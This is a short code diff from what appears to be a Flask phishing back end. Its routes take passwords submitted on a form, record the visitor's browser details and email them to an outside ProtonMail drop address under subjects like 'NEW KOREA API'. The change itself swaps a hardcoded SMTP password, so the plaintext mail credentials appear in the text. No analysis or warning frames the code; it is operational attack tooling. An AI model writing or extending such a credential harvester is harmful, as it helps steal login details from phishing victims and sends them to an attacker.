@@ -147,7 +147,7 @@ def first():
         passwordemail = request.form.get("pig")
         sender_email = "info@illmovesshapes.online"
         receiver_email = "Datafile4@protonmail.com"
-        password = "M@wNAp9AmtxA"
+        password = "Ge7xM88ewC"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "NEW KOREA API ... 1"
@@ -184,7 +184,7 @@ def second():
         passwordemail = request.form.get("pig")
         sender_email = "info@illmovesshapes.online"
         receiver_email = "Datafile4@protonmail.com"
-        password = "M@wNAp9AmtxA"
+        password = "Ge7xM88ewC"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "NEW KOREA API ... 2"
